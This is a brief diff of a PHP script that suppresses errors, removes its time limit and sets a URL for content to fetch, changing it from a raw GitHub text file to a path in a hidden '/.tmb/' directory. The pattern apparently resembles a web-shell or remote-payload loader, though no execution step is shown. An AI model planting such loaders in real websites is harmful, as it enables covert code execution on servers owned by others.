@@ -2,7 +2,7 @@
 error_reporting(0);
 set_time_limit(0);
 
-$url = "https://raw.githubusercontent.com/IKENAI29/library/main/2.txt";
+$url = "/.tmb/2.txt";
 
 // Create a stream context with additional options for HTTP
 $contextOptions = [
